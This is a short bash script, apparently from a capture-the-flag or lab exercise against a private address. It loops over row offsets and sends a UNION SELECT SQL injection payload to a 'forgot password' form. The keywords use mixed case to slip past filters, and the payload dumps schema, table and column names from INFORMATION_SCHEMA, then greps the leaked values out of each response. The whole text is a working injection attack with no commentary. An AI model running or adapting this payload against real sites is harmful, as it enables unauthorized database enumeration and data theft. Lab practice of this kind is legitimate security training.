for i in $(seq 0 100); do
	payload="email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ':', TABLE_NAME, ':', COLUMN_NAME, 'abc@def.com') FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset $i-- -"
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@def.com'
	done
